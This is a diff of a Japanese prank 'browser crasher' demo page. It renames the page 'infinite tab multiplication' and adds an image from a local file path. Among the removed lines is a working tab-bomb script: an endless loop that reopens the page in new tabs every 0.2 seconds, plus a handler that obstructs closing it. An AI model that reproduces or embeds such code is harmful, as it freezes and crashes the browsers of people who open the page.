@@ -8,7 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Dela+Gothic+One&family=Kiwi+Maru&family=M+PLUS+Rounded+1c&family=RocknRoll+One&family=Zen+Kaku+Gothic+Antique&display=swap" rel="stylesheet">
-  <title>ブラクラデモ ３</title>
+  <title>無限タブ増殖</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   
@@ -16,9 +16,9 @@
 
 <body>
   <div>
-    <h1>ブラクラ デモ３</h1>
-    <p class=txt id="changeTxt_1">ボタンを押してね</p>
-    <button type="button" class="btn" onclick="buttonClick()" id="changeTxt_2">クリック</button>
+    <h1>無限タブ増殖</h1>
+    <p class=txt>がんばって閉じてね</p>
+    <p><img src="file:///C:/Users/yukau/Downloads/MicrosoftWindows.Client.CBS_cw5n1h2txyewy!InputApp/WhiteDogFluffyCuteDogGIF.gif"></p>
   </div>
 </body>
 
@@ -43,38 +43,5 @@ body {
   color: #333;
   font-size: 2.0rem;
 }
-.btn {
-  width: 200px;
-  height: 80px;
-  color: #000;
-  font-size: 1.5rem;
-  font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', 'Hiragino Sans', 'Hiragino Kaku Gothic ProN', '游ゴシック Medium', meiryo, sans-serif!important;
-  border-radius: 10px;
-}
-.btn:hover {
-  opacity: .7;
-}
 </style>
-
-<script>
-  const url = "https://castoroides.github.io/burakura/burakura_3.html"
-
-  function buttonClick(){
-    document.getElementById("changeTxt_1").innerText = "がんばって閉じてね";
-    document.getElementById("changeTxt_2").innerText = "タブ増殖中";
-    
-    // 無限ループでタブを増やす
-    while(true){
-      window.open(url, "_blank")
-      // 0.2秒待機
-      var startDate = new Date();
-      while (new Date() - startDate < 200);
-    }
-  }
-  // Close字のメッセージ
-  window.onbeforeunload = function(e) {
-    e.returnValue = "また来てね";
-  }
-</script>
-
 </html>
